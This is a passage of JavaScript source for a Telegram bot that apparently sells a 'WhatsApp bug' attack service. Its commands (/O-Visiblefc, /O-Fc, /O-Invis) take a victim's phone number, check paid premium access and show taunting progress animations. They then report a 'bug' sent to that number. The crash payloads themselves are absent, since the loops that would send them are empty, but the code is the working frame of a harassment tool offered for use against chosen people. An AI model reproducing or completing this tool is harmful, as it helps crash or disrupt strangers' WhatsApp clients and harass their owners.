        inline_keyboard: [[{ text: "­Юџѓ­Юџё­ЮЎ▓­ЮЎ▓­ЮЎ┤­Юџѓ­Юџѓ", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `­ЪЎѕ Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/O-Visiblefc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
  const jid = Jid;
   
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "­ЮЎѓ­ЮЎќ­ЮЎЎ­ЮЎќ ­ЮЎј­ЮЎџ­ЮЎБ­ЮЎЎ­ЮЎџ­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎюсЃё ­ЮЎе­ЮЎъ­ЮЎА­ЮЎќ­ЮЎЮ­ЮЎа­ЮЎќ­ЮЎБ /­ЮЎД­ЮЎџ­ЮЎд­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎД ­ЮЎЕ­ЮЎџ­ЮЎД­ЮЎА­ЮЎџ­ЮЎЌ­ЮЎъ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎЮ­ЮЎф­ЮЎА­ЮЎфРюў"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юџј­Юџю ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    'Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 10%',
    'Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 20%',
    'Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 30%',
    'Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 40%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 50%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒ 60%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒ 70%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒ 80%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒ 90%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░ 100%'
  ];

  const texts = [
    '­ЪДе л▒ЛЃл┤ЛїЛѓлх л│лЙЛѓлЙл▓ЛІ',
    '­ЪЉ╗ л╝ЛЃЛЂЛЃЛЁл╝ЛЃ ЛѓлхЛђл╗лИЛЁл░Лѓ',
    '­Ъћњ л░л║ЛЃ л┤лИЛЂлИлйлИ ЛЃлйЛѓл░л║л╝ЛЃ',
    'РџЊ л░л┐л░л║л░ЛЁ л║л░л╝ЛЃ ЛЂЛЃл┤л░ЛЁ ЛЂлИл░л┐',
    '­Ъцг л┐лхлйЛїлхЛђл░лйл│л░лй л┤лИл╝ЛЃл╗л░л╣',
    '­ЪДа лйлх л╝лЙлХлхЛѓ л▒ЛІЛѓЛї',
    '­ЪњБ OTAX ЛЂлИл░л┐ л╝лхлйЛїлхЛђл░лйл│',
    '­Ъїђ OTAX лаЛЈл┤лЙл╝ ЛЂ ЛѓлЙл▒лЙл╣',
    '­ЪњЦ л║л░л║ ЛѓЛІ л╝лЙл╣ л▓Лђл░л│',
    'РюЁ люЛЃЛЂлйл░ЛЁл╗л░ЛЁ л┐лхл╝л▒лхлйл┤лХлИл║ЛЃ'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
${frames[i]}
РЎЏ ${texts[i]}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сЃЌсЃГсѓ╗сѓ╣   : ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­ЮўЌ­Юўд­Юў»­Юўе­Юўф­Юў│­Юўф­Юў«­Юўб­Юў» ­ЮўЅ­ЮўХ­Юўе Рюў
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
for (let i = 0; i <= 20; i++) {
      
      }
  
console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­ЮўХ­ЮўЦ­Юўб­ЮўЕ ­ЮўЅ­Юўд­Юў│­ЮўЕ­Юўб­Юў┤­Юўф­ЮўГ ­ЮўЅ­Юў░­Юў┤­Юўг­ЮўХЯЦѓЯцЙЯЦђЯЦѓ....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сѓ┐сѓцсЃасѓ┐сЃ│ : ${new Date().toLocaleString()}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "­Юџѓ­Юџё­ЮЎ▓­ЮЎ▓­ЮЎ┤­Юџѓ­Юџѓ", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `­ЪЎѕ Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/O-Fc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
   
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "­ЮЎѓ­ЮЎќ­ЮЎЎ­ЮЎќ ­ЮЎј­ЮЎџ­ЮЎБ­ЮЎЎ­ЮЎџ­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎюсЃё ­ЮЎе­ЮЎъ­ЮЎА­ЮЎќ­ЮЎЮ­ЮЎа­ЮЎќ­ЮЎБ /­ЮЎД­ЮЎџ­ЮЎд­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎД ­ЮЎЕ­ЮЎџ­ЮЎД­ЮЎА­ЮЎџ­ЮЎЌ­ЮЎъ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎЮ­ЮЎф­ЮЎА­ЮЎфРюў"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юџј­Юџю ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    'Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 10%',
    'Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 20%',
    'Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 30%',
    'Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 40%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 50%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒ 60%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒ 70%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒ 80%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒ 90%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░ 100%'
  ];

  const texts = [
    '­ЪДе л▒ЛЃл┤ЛїЛѓлх л│лЙЛѓлЙл▓ЛІ',
    '­ЪЉ╗ л╝ЛЃЛЂЛЃЛЁл╝ЛЃ ЛѓлхЛђл╗лИЛЁл░Лѓ',
    '­Ъћњ л░л║ЛЃ л┤лИЛЂлИлйлИ ЛЃлйЛѓл░л║л╝ЛЃ',
    'РџЊ л░л┐л░л║л░ЛЁ л║л░л╝ЛЃ ЛЂЛЃл┤л░ЛЁ ЛЂлИл░л┐',
    '­Ъцг л┐лхлйЛїлхЛђл░лйл│л░лй л┤лИл╝ЛЃл╗л░л╣',
    '­ЪДа лйлх л╝лЙлХлхЛѓ л▒ЛІЛѓЛї',
    '­ЪњБ OTAX ЛЂлИл░л┐ л╝лхлйЛїлхЛђл░лйл│',
    '­Ъїђ OTAX лаЛЈл┤лЙл╝ ЛЂ ЛѓлЙл▒лЙл╣',
    '­ЪњЦ л║л░л║ ЛѓЛІ л╝лЙл╣ л▓Лђл░л│',
    'РюЁ люЛЃЛЂлйл░ЛЁл╗л░ЛЁ л┐лхл╝л▒лхлйл┤лХлИл║ЛЃ'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
${frames[i]}
РЎЏ ${texts[i]}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сЃЌсЃГсѓ╗сѓ╣   : ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­ЮўЌ­Юўд­Юў»­Юўе­Юўф­Юў│­Юўф­Юў«­Юўб­Юў» ­ЮўЅ­ЮўХ­Юўе Рюў
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
for (let i = 0; i <= 25; i++) {
      
      }
console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­ЮўХ­ЮўЦ­Юўб­ЮўЕ ­ЮўЅ­Юўд­Юў│­ЮўЕ­Юўб­Юў┤­Юўф­ЮўГ ­ЮўЅ­Юў░­Юў┤­Юўг­ЮўХЯЦѓЯцЙЯЦђЯЦѓ....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
РІєРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂРћЂЯ╝ЅРђД`));
    
   

  await bot.sendMessage(chatId, `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сѓ┐сѓцсЃасѓ┐сЃ│ : ${new Date().toLocaleString()}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "­Юџѓ­Юџё­ЮЎ▓­ЮЎ▓­ЮЎ┤­Юџѓ­Юџѓ", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `­ЪЎѕ Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/O-Invis (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
   
const delay = ms => new Promise(res => setTimeout(res, ms));
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`­ЮЎђ­ЮЎЕ­ЮЎЎ­ЮЎќ­ЮЎЮ\`\`\`
­ЮЎђ­ЮЎб­ЮЎќ­ЮЎБ­ЮЎю­ЮЎБ­ЮЎ«­ЮЎќ ­ЮЎЄ­ЮЎф ­ЮЎј­ЮЎъ­ЮЎќ­ЮЎЦ­ЮЎќЯЦѓЯцЙЯЦђЯЦѓ ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "­Юўќ­ЮўИ­Юў»­Юўд­Юў│", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "­ЮЎѓ­ЮЎќ­ЮЎЎ­ЮЎќ ­ЮЎј­ЮЎџ­ЮЎБ­ЮЎЎ­ЮЎџ­ЮЎД ­Юўй­ЮЎќ­ЮЎБ­ЮЎюсЃё ­ЮЎе­ЮЎъ­ЮЎА­ЮЎќ­ЮЎЮ­ЮЎа­ЮЎќ­ЮЎБ /­ЮЎД­ЮЎџ­ЮЎд­ЮЎЦ­ЮЎќ­ЮЎъ­ЮЎД ­ЮЎЕ­ЮЎџ­ЮЎД­ЮЎА­ЮЎџ­ЮЎЌ­ЮЎъ­ЮЎЮ ­ЮЎЎ­ЮЎќ­ЮЎЮ­ЮЎф­ЮЎА­ЮЎфРюў"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

   
const sent = await bot.sendPhoto(chatId, 'https://files.catbox.moe/4v8phs.png', {
    caption: `\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юџј­Юџю ­Юўа­Юўб­ЮўгРюў....
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\``,
    parse_mode: "Markdown"
});
    const frames = [
    'Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 10%',
    'Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 20%',
    'Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 30%',
    'Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 40%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒Рќ▒ 50%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒Рќ▒ 60%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒Рќ▒ 70%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒Рќ▒ 80%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ▒ 90%',
    'Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░Рќ░ 100%'
  ];

  const texts = [
    '­ЪДе л▒ЛЃл┤ЛїЛѓлх л│лЙЛѓлЙл▓ЛІ',
    '­ЪЉ╗ л╝ЛЃЛЂЛЃЛЁл╝ЛЃ ЛѓлхЛђл╗лИЛЁл░Лѓ',
    '­Ъћњ л░л║ЛЃ л┤лИЛЂлИлйлИ ЛЃлйЛѓл░л║л╝ЛЃ',
    'РџЊ л░л┐л░л║л░ЛЁ л║л░л╝ЛЃ ЛЂЛЃл┤л░ЛЁ ЛЂлИл░л┐',
    '­Ъцг л┐лхлйЛїлхЛђл░лйл│л░лй л┤лИл╝ЛЃл╗л░л╣',
    '­ЪДа лйлх л╝лЙлХлхЛѓ л▒ЛІЛѓЛї',
    '­ЪњБ OTAX ЛЂлИл░л┐ л╝лхлйЛїлхЛђл░лйл│',
    '­Ъїђ OTAX лаЛЈл┤лЙл╝ ЛЂ ЛѓлЙл▒лЙл╣',
    '­ЪњЦ л║л░л║ ЛѓЛІ л╝лЙл╣ л▓Лђл░л│',
    'РюЁ люЛЃЛЂлйл░ЛЁл╗л░ЛЁ л┐лхл╝л▒лхлйл┤лХлИл║ЛЃ'
];

  for (let i = 0; i < frames.length; i++) {
    const loadingText = `
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
${frames[i]}
РЎЏ ${texts[i]}
Я╝њ№Иј РђбрЂірЂі||рЂі|рЂІ||||рЂІРђїРђїРђїРђїРђїрЂі|Рђб ­ЮЎі­ЮЎЈ­Юў╝­ЮЎЊ
\`\`\`
    `;
    await bot.editMessageCaption(loadingText, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    await delay(400);
  }
    await bot.editMessageCaption(`
\`\`\`
Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ сЃЌсЃГсѓ╗сѓ╣   : ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­ЮўЌ­Юўд­Юў»­Юўе­Юўф­Юў│­Юўф­Юў«­Юўб­Юў» ­ЮўЅ­ЮўХ­Юўе Рюў
\`\`\`
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });
    
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
     console.log(chalk.blue(`\n
РћЂРћЂРћЂсђљ­ЮЋє­ЮЋІ­ЮћИ­ЮЋЈсђЉРћЂРћЂРћЂ
 Рюў ­ЮЎЙ­ЮџЃ­ЮЎ░­ЮџЄ ­ЮЎ░­ЮџЃ­ЮџЃ­ЮЎ░­ЮЎ▓­ЮЎ║ ­Юџѕ­ЮЎЙ­Юџё! Рюў
РЎЏ сѓ┐сЃ╝сѓ▓сЃЃсЃѕ : ${formattedNumber}
РЎЏ уіХТЁІ : ­Юўџ­Юўб­ЮўБ­Юўб­Юў│ ­Юўћ­Юўб­Юў┤­Юўф­ЮўЕ ­ЮўЌ­Юў│­Юў░­Юў┤­Юўд­Юў┤ ­Юўа­Юўб­ЮўгРюў....
